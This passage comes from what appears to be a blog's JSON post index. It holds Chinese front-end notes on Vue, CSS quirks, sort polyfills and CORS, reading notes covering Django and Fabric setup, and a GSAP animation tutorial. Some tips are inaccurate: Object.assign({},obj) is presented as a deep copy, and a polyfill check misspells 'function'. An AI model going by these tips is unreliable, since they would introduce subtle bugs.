style=&quot;height:100%&quot; ref=&quot;elscrollbar&quot;&gt;\nvar div = this.$refs[&#39;elscrollbar&#39;].$refs[&#39;wrap&#39;];\nthis.$nextTick(() =&gt; {\n    div.scrollTop = div.scrollHeight\n})</code></pre><h3 id=\"怎么应用vertical-align，才能生效？\">怎么应用vertical-align，才能生效？</h3>\n<p><a href=\"https://blog.csdn.net/diudiu5201/article/details/54666809\">怎么应用vertical-align，才能生效</a></p>\n<ol>\n<li><p>父元素（inline-block\\block）必须含有line-height（inline元素有无皆可），子元素（inline-block/inline元素）中的vertical-align才能起作用。\nvertical-align不可继承，必须对子元素单独设置。</p>\n</li>\n<li><p>当父元素没有设置line-height时，vertical-align只对行内元素的兄弟元素对齐有用，无法子元素居中对齐父元素。\n设置了vertical-align:middle的子元素的中线与兄弟元素的基线对齐。若兄弟元素都设置该项，则居中对齐。</p>\n</li>\n</ol>\n<h3 id=\"arrayprototypesort-兼容\">Array.prototype.sort 兼容</h3>\n<p>IE9-- Array.prototype.sort 不能根据 对象属性 做排序的遗憾 </p>\n<pre><code class=\"language-javascript\">//方法1冒泡排序\nvar mySort = function(fn){\n    if(typeof fn != &#39;function&#39;){\n        fn = function(a,b){\n            return a-b;\n        }\n    }\n\n    for(var i=0; i &lt; this.length-1;i++){\n        for(var j=i+1;j&lt;this.length;j++){\n            var t = this[i];\n            if(fn(this[i],this[j]) &gt; 0){\n                this[i] = this[j];\n                this[j] = t;\n            }\n        }\n    }\n    return this;\n}\n\nif(typeof Array.prototype.sorts!= &#39;fucntion&#39;){\n    Array.prototype.sorts = mySort;\n    mySort = null;\n}\n\n\n//方法2 插入排序\nvar mySort = function(fn){\n    if(typeof fn != &#39;function&#39;){\n        fn = function(a,b){\n            return a-b;\n        }\n    }\n    for(var i=1;i&lt;this.length;i++){\n        var t = this[i];\n        var j = i-1;\n        while(j &gt;= 0 &amp;&amp; fn(this[j],t)&gt; 0 ){\n            this[j+1] = this[j];\n            j--;\n        }\n        this[j+1] = t;\n\n    }\n    return this;\n\n}\nif(typeof Array.prototype.sorts!= &#39;fucntion&#39;){\n    Array.prototype.sorts = mySort;\n    mySort = null;\n}</code></pre>\n<p>safari 不支持函数参数 </p>\n<pre><code class=\"language-javascript\">!function(window){ \n    var ua = window.navigator.userAgent.toLowerCase(), \n    reg = /msie|applewebkit.+safari/; \n    if(reg.test(ua)){ \n        var _sort = Array.prototype.sort; \n        Array.prototype.sort = function(fn){ \n            if(!!fn &amp;&amp; typeof fn === &#39;function&#39;){ \n                if(this.length &lt; 2) return this; \n                var i = 0, j = i + 1, l = this.length, tmp, r = false, t = 0; \n                for(; i &lt; l; i++){ \n                    for(j = i + 1; j &lt; l; j++){ \n                        t = fn.call(this, this[i], this[j]); \n                        r = (typeof t === &#39;number&#39; ? t : \n                        !!t ? 1 : 0) &gt; 0 \n                        ? true : false; \n                        if(r){ \n                            tmp = this[i]; \n                            this[i] = this[j]; \n                            this[j] = tmp; \n                        } \n                    } \n                } \n                return this; \n            }else{ \n                return _sort.call(this); \n            } \n        }; \n    } \n}(window); </code></pre>\n<p><a href=\"https://blog.csdn.net/lt3487928/article/details/53157817\">https://blog.csdn.net/lt3487928/article/details/53157817</a></p>\n<p><a href=\"https://www.cnblogs.com/Alucelx/archive/2011/07/13/2104381.html\">https://www.cnblogs.com/Alucelx/archive/2011/07/13/2104381.html</a></p>\n<h2 id=\"20187\">2018/7</h2>\n<h3 id=\"vue强制更新\">vue强制更新</h3>\n<p>用vue.$set不行，watch不行，试试$forceUpdate。\n还有一种办法，再把值重新复制一遍也是可以的\n<code>this.obj = Object.assign({},this.obj)</code></p>\n<h3 id=\"在vue中使用sass及sass图片路径问题\">在Vue中使用sass及sass图片路径问题</h3>\n<p><a href=\"https://www.jianshu.com/p/5e81814f8d8c\">https://www.jianshu.com/p/5e81814f8d8c</a></p>\n<h3 id=\"cors跨域请求\">CORS跨域请求</h3>\n<p>会先发option请求，如果server返回access-control-allow-origin头为*或者和当前域名一致的话，才会进入第二段的真正请求。</p>\n<h3 id=\"禁止缓存数据deactivated\">禁止缓存数据deactivated</h3>\n<p> 防止下次选择数据不更新</p>\n<pre><code class=\"language-js\">  deactivated () {\n    this.$destroy(true)\n  }</code></pre>\n<h3 id=\"深拷贝\">深拷贝</h3>\n<p> <code>arr.slice()</code>\n 如果obj所有值都是非引用类型，那么obj.slice(0)与深浅拷贝没有差别；</p>\n<p>如果obj有引用类型的元素的话，obj.slice(0)仅仅是复制了元素的地址，，obj.slice(0)可看作浅拷贝。</p>\n<p>对象深拷贝 <code>Object.assign({},obj)</code>,不要用JSON.parse(JSON.stringify(obj)),太慢</p>\n<h3 id=\"事件冒泡到父容器或某个祖先容器停止\">事件冒泡到父容器或某个祖先容器停止</h3>\n<p>在父容器或某个祖先容器上绑定一个<code>@click.stop=&#39;stop&#39;</code>\nstop函数为一个空函数即可</p>\n<h2 id=\"201810\">2018/10</h2>\n<h3 id=\"webpack-dev-server启动\">webpack-dev-server启动</h3>\n<p>并不是访问vue项目内某个文件, src/assets内的文件是不能在index.html直接引用的, 必须经过loader处理路径</p>\n<p>plublic里放置的文件是不经过 webpack 处理的。在 index.html 里引用的时候，直接就是 <code>&lt;script src=&quot;/plublic/oidc-client.js&quot;&gt;&lt;/script&gt;。</code></p>\n<h3 id=\"scss-export\">scss export</h3>\n<pre><code class=\"language-scss\">\n $title-width: 100;\n\n:export {\n  titleWidth: $title-width;\n}</code></pre>\n<h3 id=\"ie-margin-top负值无效\">ie margin-top负值无效</h3>\n<p><a href=\"https://www.cnblogs.com/chaozhang/p/4711282.html\">https://www.cnblogs.com/chaozhang/p/4711282.html</a></p>\n<p>加上display:inline-block</p>\n<h3 id=\"inline-block的元素设置over-flowhidden会意外地增加元素总体高度，\">inline-block的元素设置over-flow:hidden会意外地增加元素总体高度，</h3>\n<p>用vertical-align:bottom解决</p>\n<h3 id=\"ie中img被拉伸\">ie中img被拉伸</h3>\n<p>只要设置img为 height:auto，width:auto，就不会出现这种情况了</p>\n<h3 id=\"vue-路由query变化监测不到meta的\">vue 路由query变化监测不到meta的</h3>\n<p>这样使用query,路由变化，meta并没有变化</p>\n<pre><code class=\"language-js\">{\n    name: &#39;order.list.1&#39;,\n    path: &#39;/order/list/status=1&#39;,\n    component: list,\n    meta: {\n      domain: &#39;order&#39;,\n      key: &#39;order-list-1&#39;,\n    },\n  },\n\n  {\n    name: &#39;order.list.2&#39;,\n    path: &#39;/order/list/status=2&#39;,\n    component: list,\n    meta: {\n      domain: &#39;order&#39;,\n      key: &#39;order-list-2&#39;,\n    },\n  },</code></pre>\n<p>使用params是可以的</p>\n<pre><code class=\"language-js\">{\n    name: &#39;order.list.1&#39;,\n    path: &#39;/order/list/1&#39;,\n    component: list,\n    meta: {\n      domain: &#39;order&#39;,\n      key: &#39;order-list-1&#39;,\n    },\n  },\n\n  {\n    name: &#39;order.list.2&#39;,\n    path: &#39;/order/list/2&#39;,\n    component: list,\n    meta: {\n      domain: &#39;order&#39;,\n      key: &#39;order-list-2&#39;,\n    },\n  },</code></pre>\n<p>使用函数模式也可以</p>\n<pre><code class=\"language-js\">const dict = {\n  1: &#39;order-list-1&#39;,\n  2: &#39;order-list-2&#39;,\n  default: &#39;order-list&#39;,\n};\n\n\nexport default{\n  name: &#39;order&#39;,\n  path: &#39;/order&#39;,\n  redirect: {\n    name: &#39;order.list&#39;,\n  },\n  component: Container,\n  children: [{\n    name: &#39;order.list&#39;,\n    path: &#39;/order/list&#39;,\n    component: list,\n    meta: {\n      domain: &#39;order&#39;,\n      key(route) {\n        return dict[route.query.status || &#39;default&#39;];\n      },\n    },\n  },</code></pre>\n<h3 id=\"vue-指令使用模板，不再用template了，用el\">vue 指令使用模板，不再用template了，用el</h3>\n<pre><code class=\"language-js\">//Marquee.js\nimport Marquee from &#39;./Marquee.vue&#39;;\nconst Tpl = Vue.extend(Marquee);//这个好漂亮\nconst Plugin = {\n  install(vue, options) {\n        Vue.directive(&#39;marquee&#39;, {\n           inserted(el, binding, vnode) {\n              const mask = new Tpl({\n                  el: document.createElement(&#39;div&#39;),\n                  data: { name: binding.value }\n              });\n              el.appendChild(mask.$el);\n           })\n     }   \n  }\n}\nexport default Plugin;\n//main.js\nimport Marquee from &#39;./Marquee.js&#39;\nVue.use(Marquee)</code></pre>\n<h2 id=\"201812\">2018/12</h2>\n<h3 id=\"完美解决本地和服务器上资源url解析的问题\">完美解决本地和服务器上资源url解析的问题</h3>\n<p>在 config/index.js 中修改 assetsPublicPath 为 ./\n在 build/utils.js 中的 ExtractTextPlugin.extract 传入参数 publicPath: &#39;../../&#39;</p>\n<h2 id=\"知识记录\">知识记录</h2>\n<h3 id=\"forfor-infor-eachfor-of\">for\\for-in\\for-each\\for-of</h3>\n<p>for-in不仅可以遍历数组还可以遍历对象\nfor-in 遍历属性的顺序并不确定，即输出的结果顺序与属性在对象中的顺序无关，也与属性的字母顺序无关，与其他任何顺序也无关。\n使用for-in在遍历的时候，它不仅遍历了对象上的属性，而且还遍历了对象父类原型上的属性。\n所以for-in并不适合遍历Array中的元素，更适合遍历对象中的属性\nfor-in只会遍历存在的实体,以及对应的原型链上的属性.因此其速度相比较其他for循环，要慢一些。\n所以除非明确要迭代一个属性数量未知的对象，否则应该避免使用for-in。\nfor-in遍历数组的缺点：数组的下标index值是数字，for-in遍历的index值&quot;0&quot;,&quot;1&quot;,&quot;2&quot;等是字符串</p>\n<p>在不同浏览器下测试的结果都是 forEach 的速度不如 for。\nforEach主要应用在遍历数组，但是它的性能并不如for，因此可以使用for就尽量不要使用forEach。\n<strong>forEach 不能break 或者return</strong></p>\n<p><strong>for-of不支持普通对象遍历，只返回具有数字索引的属性</strong>.</p>\n<p>遍历数组：for-of &gt; for &gt; for-each\n遍历对象：for-in(要用hasOwnProperty)\nawait/async 要用for-of\nfor循环、while循环、do-while循环比for in 要快</p>\n<h3 id=\"字符串-拼接性能\">字符串 拼接性能</h3>\n<p>比较下四中字符串拼接方法的性能：</p>\n<pre><code>A：str = str + &#39;a&#39;+&#39;b&#39;\nB:str += &#39;a&#39; + &#39;b&#39;\nC: arr.join(&#39;&#39;)\nD:str.concat(&#39;b&#39;,&#39;c&#39;)</code></pre><p>☆ Chrome65上测试的是A优于B优于C优于D</p>\n<h3 id=\"总结一些常用的\">总结一些常用的</h3>\n<ol>\n<li>内容长短不固定的时候用min-height,而不要用height</li>\n<li>显示一行，多余的用省略号表示<pre><code class=\"language-css\"> .one-line{\n     overflow: hidden;\n     text-overflow: ellipsis;\n     white-space: nowrap;\n     display: inline-block;\n }</code></pre>\n 最多显示2行，多余的用省略号表示<pre><code class=\"language-css\"> .two-line{     \n     overflow: hidden;     \n     display: -webkit-box;\n     -webkit-box-orient: vertical;\n     -webkit-line-clamp: 2;\n     text-overflow: ellipsis;\n }</code></pre>\n</li>\n<li>一般英文或者数字是默认不换行，所以要加上<pre><code class=\"language-css\"> word-break: break-all;</code></pre>\n</li>\n<li>placeholder<pre><code class=\"language-css\">:-moz-placeholder { /* Mozilla Firefox 4 to 18 */\n color: #C6C6C6;\n}\n</code></pre>\n</li>\n</ol>\n<p>::-moz-placeholder { /* Mozilla Firefox 19+ */\n    color: #C6C6C6;\n}</p>\n<p>input:-ms-input-placeholder{\n    color: #C6C6C6;\n}</p>\n<p>input::-webkit-input-placeholder{\n    color: #C6C6C6;\n}</p>\n<pre><code>\n\n\n### vue源码研读\n[手拉手带你过一遍vue部分源码](https://juejin.im/post/5adff30f518825672d33d596)\n\n[当面试官问你Vue响应式原理，你可以这么回答他](https://juejin.im/post/5adf0085518825673123da9a)\n\n[如何解释vue的生命周期才能令面试官满意？](https://juejin.im/post/5ad10800f265da23826e681e)\n\n在使用.vue文件开发的过程当中，我们在里面写了template模板，在经过了vue-loader的处理之后，就变成了render function，最终放到了vue-loader解析过的文件里面。这样做有什么好处呢？原因是由于在解析template变成render function的过程，是一个非常耗时的过程，vue-loader帮我们处理了这些内容之后，当我们在页面上执行vue代码的时候，效率会变得更高。\n\nVue为我们提供了renderError方法，这个方法只有在开发的时候它才会被调用，在正式打包上线的过程当中，它是不会被调用的。它主要是帮助我们调试render里面的一些错误。\n```javascript\nrenderError (h, err) {\n  return h(&#39;div&#39;, {}, err.stack)\n}</code></pre><p>有且只有当render方法里面报错了，才会执行renderError方法。\n所以我们主动让render函数报个错：</p>\n<pre><code class=\"language-javascript\">render (h) {\n  throw new TypeError(&#39;render error&#39;)\n}</code></pre>\n<p>还有一点，renderError只有在<code>本组件</code>的render方法报错的情况下它才会被调用。</p>\n<h3 id=\"cache-control\">Cache-Control</h3>\n<pre><code>no-cache: 告诉浏览器、缓存服务器，不管本地副本是否过期，使用资源副本前，一定要到源服务器进行副本有效性校验。\nmust-revalidate：告诉浏览器、缓存服务器，本地副本过期前，可以使用本地副本；本地副本一旦过期，必须去源服务器进行有效性校验。\nmax-age： 指缓存资源的缓存时间比指定的值小，那么客户端就接受缓存资源，且缓存服务器不对资源有效性进行再次确认</code></pre><h3 id=\"css像素\">CSS像素</h3>\n<p>是web编程的概念,是相对的而不是绝对的单位. 用户的缩放比会影响单位CSS像素点对应的实际物理像素的多少</p>\n<h3 id=\"使用flexible实现手淘h5页面的终端适配\">使用Flexible实现手淘H5页面的终端适配</h3>\n<p>   <a href=\"https://github.com/amfe/article/issues/17\">https://github.com/amfe/article/issues/17</a></p>\n<h3 id=\"禁止使用documentwrite\">禁止使用document.write()</h3>\n<p>异步脚本禁止使用document.write()\n延迟脚本禁止使用document.write()</p>\n<h3 id=\"export及export-default的区别\">export及export default的区别</h3>\n<p>在一个文件或模块中，export可以有多个，export default仅有一个。 </p>\n<ul>\n<li>export</li>\n</ul>\n<p>(1) 导入的时候带花括号</p>\n<pre><code>```javascript\n    // 写法一\n    export var m = 1;\n\n    // 写法二\n    var m = 1;\n    export {m}; //export m 或者export 1都错误\n\n    // 写法三\n    var n = 1;\n    export {n as m};\n```</code></pre><p>(2) export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。</p>\n<ul>\n<li>export default </li>\n</ul>\n<p>(1) 导入的时候没有花括号</p>\n<pre><code>```javascript\n    import str from &#39;demo1&#39; //导入的时候没有花括号\n```</code></pre><p>(2) export default命令的本质是将后面的值，赋给default变量，所以可以直接将一个值写在export default之后。</p>\n<h3 id=\"用mpvue开发小程序了\">用mpVue开发小程序了</h3>\n<p><a href=\"https://www.itcodemonkey.com/article/2573.html\">https://www.itcodemonkey.com/article/2573.html</a></p>\n","index":13},{"filePath":"post\\2018\\3\\16-full-stack-develop-study.md","htmlPath":"/post/2018/3/16-full-stack-develop-study.html","name":"16-full-stack-develop-study.md","type":"md","layout":"post","title":"读《全栈应用开发精益实践>","date":"2018-3-16 13","img":"20180131.jpg","categories":"Reading","tags":"读书笔记","html":"<p>这本书以前翻过几章，但是因为其他事情耽搁了，重新阅读已不太记得讲了什么，故重新阅读</p>\n<h3 id=\"系统工具\">系统工具</h3>\n<table>\n<thead>\n<tr>\n<th>System</th>\n<th align=\"left\">包管理</th>\n<th align=\"left\">快速启动</th>\n<th align=\"left\">命令行</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>window</td>\n<td align=\"left\">chocolatey</td>\n<td align=\"left\">wox</td>\n<td align=\"left\">cmder/Cygwin</td>\n</tr>\n<tr>\n<td>GNU/Linux</td>\n<td align=\"left\">apt/yum/yast</td>\n<td align=\"left\">Launchy</td>\n<td align=\"left\">Zsh</td>\n</tr>\n<tr>\n<td>Mac</td>\n<td align=\"left\">Homebrew</td>\n<td align=\"left\"></td>\n<td align=\"left\">iTerm2</td>\n</tr>\n</tbody></table>\n<h3 id=\"回到顶部\">回到顶部</h3>\n<p><code>&lt;a href=&quot;#&quot;&gt;回到顶部&lt;/a&gt;</code></p>\n<h3 id=\"沟通\">沟通</h3>\n<ul>\n<li>每日站会。讲述昨天今天做了什么，遇到什么问题。</li>\n<li>结对编程。两个人实现一个功能除了可以减少bug，还能分享。</li>\n<li>代码审查</li>\n<li>开卡和验收。开发人员和业务分析人员、测试人员一起开卡来进行新的任务，并在最后一起验收。</li>\n<li>迭代回顾。</li>\n</ul>\n<h3 id=\"软件质量\">软件质量</h3>\n<ul>\n<li>测试驱动开发。先写测试，再实现代码，最后对代码进行重构。</li>\n<li>重构。</li>\n<li>技术债管理。由于发布临近，可能在这次发布里使用一些比较粗暴的方式来实现功能，代码不太吗。每当出现一点时就对问题进行标识，在适当的时候修复，若果所欠的债务越来越多，意味着软件的质量受到影响，需要重新审视这个问题。</li>\n<li>浮现式设计。敏捷开发并不意味着架构设计不存在，在实践过程中依据问题改进代码。随着对软件质量的重视，我们的架构就会浮现出来。<h3 id=\"数据持久化\">数据持久化</h3>\n</li>\n<li>文件存储。\nGoAcess/Hadoop/Spark.Logstash/ElasticSearch/Kibana</li>\n<li>数据库<ul>\n<li>关系数据库。MYSQL/SQLite3/PostgreSQL</li>\n<li>非关系数据库。NoSQL/MongoDB/Redis/Cassandra</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"ui框架。foundationskeletonpurecss\">UI框架。Foundation/Skeleton/Pure.css</h3>\n<h3 id=\"django\">Django</h3>\n<ul>\n<li><p>安装\n  <code>pip install Django =1.10.2</code></p>\n</li>\n<li><p>创建项目\n  <code>django-admin startproject project-name</code></p>\n<p>文件结构\n```</p>\n</li>\n<li><p>project-name</p>\n<ul>\n<li><strong>pycache</strong></li>\n<li>project-name<ul>\n<li><strong>init</strong>.py//指明这是一个Python模块</li>\n<li>settings.py //包含数据库环境、启用插件等的配置</li>\n<li>urls.py//指明了某个URL应该指向某个函数来处理</li>\n<li>wsgi.py//用于部署</li>\n</ul>\n</li>\n<li>manage.py //可以和django-admin做类似的事情</li>\n<li>db.sqlite3\n```</li>\n</ul>\n</li>\n<li><p>启动服务器\n  <code>python manage.py runserver</code></p>\n<p>   打开 “<a href=\"http://localhost:8000/%E2%80%9D\">http://localhost:8000/”</a></p>\n<ul>\n<li>下载SQLite3数据库 <a href=\"https://sqlite.org/download.html\">https://sqlite.org/download.html</a></li>\n<li>数据库迁移\n  <code>python manage.py migrate</code></li>\n<li>创建超级用户来登录后台\n  <code>python manage.py createsuperuser</code></li>\n<li>登录后台-打开 “<a href=\"http://localhost:8000/admin%E2%80%9D\">http://localhost:8000/admin”</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"fabric搭建构建系统\">Fabric搭建构建系统</h3>\n<ul>\n<li><p>安装<code>pip install fabric3</code></p>\n</li>\n<li><p>创建<code>fabfile.py</code>。执行  <code>fab 函数名:arg</code><br>fab命令从fabfile.py里面寻找对应的函数来执行</p>\n</li>\n<li><p>fabric有两种运行方式</p>\n<ul>\n<li><p>本地运行 <code>local函数</code></p>\n<p>  需要<code>from fabric.api import local</code></p>\n</li>\n<li><p>在远程机器上执行命令</p>\n</li>\n</ul>\n</li>\n<li><p><code>fab --list</code> 会列出<code>fabfile.py</code>文件中所有有<code>@task</code>修饰器的方法</p>\n<h3 id=\"代码风格监测\">代码风格监测</h3>\n</li>\n<li><p>pep8 </p>\n<p>  安装<code>pip install pep8--1.7.0</code></p>\n<p>  执行 <code>pep .</code></p>\n</li>\n<li><p>pylint</p>\n<p>  安装 <code>pip install pylint</code>,再加入requirements.txt即可。</p>\n<p>  有pylint-django插件</p>\n</li>\n<li><p>Flake8,他包装了</p>\n<p>  静态检查<strong>PEP8</strong>风格的pep8,</p>\n<p>  静态检查<strong>python代码逻辑错误</strong>的PyFlakes, </p>\n<p>  静态分析<strong>pyhon代码复杂度</strong>的Ned Batchelder&#39;sMcCabe script</p>\n<h3 id=\"创建应用\">创建应用</h3>\n</li>\n</ul>\n<p>在<code>project-name/project-name</code>目录下</p>\n<p><code>django-admin startapp homepage</code></p>\n<p>文件目录</p>\n<pre><code>    - project-name          \n        - project-name\n            - __init__.py //指明这是一个Python模块\n            - settings.py //包含数据库环境、启用插件等的配置\n            - urls.py  //指明了某个URL应该指向某个函数来处理\n            - wsgi.py  //用于部署\n            - requirements\n                - dev.txt\n                - prod.txt\n\n        - homepage \n            - __init__.py\n            - admin.py\n            - apps.py\n            - models.py // 模型\n            - tests.py\n            - views.py //业务逻辑\n            - migratios\n                - __init__.py\n\n\n        - templates\n        - static\n\n        - manage.py // 可以和django-admin做类似的事情\n        - fabfile.py // fab命令寻找的文件\n        - db.sqlite3\n</code></pre>","index":14},{"filePath":"post\\2018\\3\\6-H5.md","htmlPath":"/post/2018/3/6-H5.html","name":"6-H5.md","type":"md","title":"制作H5动画页面","date":"2018/3/6","categories":"Collection","tags":"专题探究","html":"<p>突然看到有H5页面外快做，看到微信朋友圈发的那些H5页面里面都用的了TweenMax，所以来研究一下，结果吓一跳，太太太强大了！！！！</p>\n<h1 id=\"复习一下css3\">复习一下CSS3</h1>\n<pre><code>background-size: width height\nbackground-clip:content-box/padding-box/border-box\nbackground-origin:content-box/padding-box/border-box\nbackground-image:url(bg_flower.gif),url(bg_flower_2.gif);多个背景\n\ntext-shadow:水平阴影 垂直阴影 模糊距离 阴影的颜色\nbox-shadow: 水平阴影 垂直阴影 模糊距离  阴影的尺寸 阴影的颜色\n\nclip: rect (top, right, bottom, left)\n&lt;top&gt;和&lt;bottom&gt;指定偏移量是从元素盒子顶部边缘算起；\n&lt;left&gt;和&lt;right&gt;指定的偏移量是从元素盒子左边边缘算起。\n\n\nword-wrap:break-word\n@font-face\n\n转换\ntransform:translate()/rotate()/scale()/skew()/matrix()/rotateX()/rotateY()\n\n动画\ntransition:transition-property transition-duration transition-timing-function transition-delay\n        @keyframes myfirst\n        {\n        from {background: red;}\n        to {background: yellow;}\n        }\n        animation: myfirst 5s;\n\n多列，这个只能平均分\ncolumn-count\ncolumn-gap\ncolumn-rule\n\nresize:both 可以鼠标拖拽\nbox-sizing:border-box;\n\noutline:2px solid red;\noutline-offset:15px;\n</code></pre><h1 id=\"greensock\">GreenSock</h1>\n<h2 id=\"参考资料\">参考资料</h2>\n<p>了解资料</p>\n<p><a href=\"https://greensock.com/get-started-js#intro\">greensock get-started-js</a></p>\n<p><a href=\"https://greensock.com/css3\">3D Transforms &amp; More CSS3 Goodies Arrive in GSAP JS</a></p>\n<p>基础实例</p>\n<p><a href=\"https://greensock.com/jump-start-js#welcome\">Jump Start: GSAP JS</a></p>\n<p><a href=\"https://greensock.com/position-parameter\">Timeline Tip: Understanding the Position Parameter</a></p>\n<p><a href=\"https://codepen.io/GreenSock/pen/qeHac\">Basic play / pause toggle button</a></p>\n<p><a href=\"https://tympanus.net/codrops/2015/03/25/jump-loader-animation-svg-gsap/\">create a playful Jump Loader animation</a></p>\n<p>进阶\n<a href=\"https://css-tricks.com/writing-smarter-animation-code/\">Writing Smarter Animation Code</a></p>\n<p><a href=\"https://greensock.com/examples-showcases\">https://greensock.com/examples-showcases</a></p>\n<p><a href=\"https://tympanus.net/codrops/\">https://tympanus.net/codrops/</a>\n隆重介绍这个网站，上面有好多好多好看的动画</p>\n<h2 id=\"介绍\">介绍</h2>\n<p>GreenSock Animation Platform(GSAP)\n是一套脚本动画工具。它包括：</p>\n<p>{% blockquote %}</p>\n<ul>\n<li><code>TweenLite</code>: the core of the engine which handles animating just about any property of any object. It is relatively lightweight yet full-featured and can be expanded using optional plugins (like CSSPlugin for animating DOM element styles in the browser, or ScrollToPlugin scrolling to a specific location on a page or div, etc.)</li>\n<li><code>TweenMax</code>: TweenLite&#39;s beefy big brother; it does everything TweenLite can do plus non-essentials like repeat, yoyo, repeatDelay, etc. It includes many common plugins too like CSSPlugin so that you don&#39;t need to load as many files. The focus is on being full-featured rather than lightweight.</li>\n<li><code>TimelineLite</code>: a powerful, lightweight sequencing tool that acts like a container for tweens, making it simple to control them as a whole and precisely manage their timing in relation to each other. You can even nest timelines inside other timelines as deeply as you want. This allows you to modularize your animation workflow easily.</li>\n<li><code>TimelineMax</code>: extends TimelineLite, offering exactly the same functionality plus useful (but non-essential) features like repeat, repeatDelay, yoyo, currentLabel(), and many more. Again, just like TweenMax does for TweenLite, TimelineMax aims to be the ultimate full-featured tool rather than lightweight.</li>\n<li>Extras like easing tools, plugins, utilities like Draggable, and more</li>\n</ul>\n<p>{% endblockquote %}</p>\n<h2 id=\"tweenlite-可以解决基础动画\"><code>TweenLite</code> 可以解决基础动画</h2>\n<h3 id=\"动画曲线\">动画曲线</h3>\n<p>Lightweight TweenLite: Power0, Power1, Power2, Power3, Power4, Linear, Quad, Cubic, Quart, Quint, and Strong </p>\n<p>EasePack : Elastic, SlowMo, Bounce, SteppedEase, Sine, Circ, and Expo<a href=\"https://greensock.com/ease-visualizer\">https://greensock.com/ease-visualizer</a></p>\n<h3 id=\"2d转换\">2D转换</h3>\n<pre><code>rotation, \nscaleX,\nscaleY,\nscale, \nskewX, \nskewY,\nx, (相当于css的translateX)\ny, (相当于css的translateY)\nxPercent, \nyPercent</code></pre><ul>\n<li>you could set <code>xPercent</code> and <code>yPercent</code> to <code>-50</code> and <code>position:&quot;absolute&quot;</code> so that everything starts with their centers in the same spot</li>\n<li>IE6, IE7, and IE8 transforms don&#39;t apply to child elements (that&#39;s a browser limitation).</li>\n</ul>\n<h3 id=\"3d转换\">3D转换</h3>\n<pre><code>rotationX, \nrotationY, \nrotationZ (identical to regular &quot;rotation&quot;), \nz,(相当于css的translateZ)\nperspective,\ntransformPerspective</code></pre><ul>\n<li><p>To get your elements to have a true 3D visual perspective applied, you must either set the <code>&quot;perspective&quot;</code> property of the parent element or set the special <code>&quot;transformPerspective&quot;</code> of the element itself (common values range from around 200 to 1000, the lower the number the stronger the perspective distortion)</p>\n<p>  {% blockquote %}</p>\n<p>  perspective distortion透视变形指的是一个物体及其周围区域与标准镜头中看到的相比完全不同，由于远近特征的相对比例变化，发生了弯曲或变形。</p>\n<p>  {% endblockquote %}</p>\n</li>\n</ul>\n<h3 id=\"重要属性\">重要属性</h3>\n<ul>\n<li><p>transformOrigin </p>\n<ul>\n<li>Sets the origin around which all transforms occur. By default, it is in the center of the element (&quot;50% 50%&quot;).</li>\n</ul>\n</li>\n<li><p>directionalRotation</p>\n<ul>\n<li>_cw, _ccw , _short</li>\n</ul>\n</li>\n<li><p>autoAlpha</p>\n</li>\n<li><p>className</p>\n</li>\n<li><p>autoRound\n  By default, CSSPlugin will round pixel values and zIndex to the closest integer during the tween\n  if you&#39;d rather disable that behavior, pass autoRound:false\n  You can still use the RoundPropsPlugin to manually define properties that you want rounded.</p>\n</li>\n<li><p>immediateRender :默认值true,在 from(), fromTo(), staggerFrom() and staggerFromTo() 方法中用</p>\n</li>\n<li><p>force3D :默认false</p>\n<h3 id=\"controlling-tween\">Controlling tween</h3>\n<p>  tween.pause();</p>\n<pre><code>  tl.pause() // pauses the animation\n  tl.paused() // gets paused state, returns true or false\n  tl.paused(true) // sets paused state to true\n  tl.paused(!tl.paused()) // sets paused state to inverse of current paused state.</code></pre><p>  tween.resume();\n  tween.reverse();\n  tween.seek(0.5);\n  tween.timeScale(0.5);\n  tween.timeScale(2);\n  tween.kill();</p>\n<p>  TweenLite.killTweensOf(myElement);</p>\n</li>\n</ul>\n<h2 id=\"timelinelite-让动画有序和组织\"><code>TimelineLite</code> 让动画有序和组织</h2>\n<pre><code class=\"language-js\">//create a TimelineLite instance\nvar tl = new TimelineLite();\n\n//append a to() tween\ntl.to(element, 1, {width:&quot;50%&quot;});\n\n//add another sequenced tween (by default, tweens are added to the end of the timeline which makes sequencing simple)\ntl.to(element, 1, {height:&quot;300px&quot;, ease:Elastic.easeOut});\n\n//offset the next tween by 0.75 seconds so there&#39;s a gap between the end of the previous tween and this new one\ntl.to(element, 1, {opacity:0.5}, &quot;+=0.75&quot;);\n\n//overlap the next tween with the previous one by 0.5 seconds (notice the negative offset at the end)\ntl.to(element, 1, {backgroundColor:&quot;#FF0000&quot;}, &quot;-=0.5&quot;);\n\n//animate 3 elements (e1, e2, and e3) to a rotation of 60 degrees, and stagger their start times by 0.2 seconds\ntl.staggerTo([e1, e2, e3], 1, {rotation:60}, 0.2);\n\n//then call myFunction()\ntl.call(myFunction);\n\n//now we can control the entire sequence with the standard methods like these:\ntl.pause();\ntl.resume();\ntl.restart();\ntl.reverse();\ntl.play();\n\n//jump to exactly 2.5 seconds into the animation\ntl.seek(2.5);\n\n//slow down playback to 10% of the normal speed\ntl.timeScale(0.1);\n\n//add a label named &quot;myLabel&quot; at exactly 3 seconds:\ntl.add(&quot;myLabel&quot;, 3);\n\n//add a tween that starts at &quot;myLabel&quot;\ntl.add( TweenLite.to(element, 1, {scale:0.5}), &quot;myLabel&quot;);\n\n//jump to &quot;myLabel&quot; and play from there:\ntl.play(&quot;myLabel&quot;);\n</code></pre>\n<h2 id=\"timelinemax和tweenmax-多一些功能\"><code>TimelineMax</code>和<code>TweenMax</code> 多一些功能</h2>\n<pre><code>repeat, \nyoyo:Boolean\nrepeatDelay and more.</code></pre><p><code>TimelineMax</code> 还有方法</p>\n<pre><code>tweenTo(), \ncurrentLabel(),\ngetLabelBefore() \ngetLabelAfter() and more.</code></pre><h2 id=\"overwriting-other-tweens\">Overwriting other tweens</h2>\n<p> all,none,auto</p>\n<p>TweenLite.defaultOverwrite = &quot;all&quot;;</p>\n<h2 id=\"其它\">其它</h2>\n<p> stagger可以让多个元素执行同一个动画</p>\n","index":15},{"filePath":"post\\2018\\4\\deepClone.md","htmlPath":"/post/2018/4/deepClone.html","name":"deepClone.md","type":"md","title":"深度克隆","date":"2018/4/26","categories":"Collection","tags":"专题探究","html":"<h2 id=\"第一种方法（只适用于基础类型）\">第一种方法（只适用于基础类型）</h2>\n<p> <code>const newObj = JSON.parse(JSON.stringify(oldObj));</code></p>\n<h2 id=\"第二种方法\">第二种方法</h2>\n<p>实现对函数 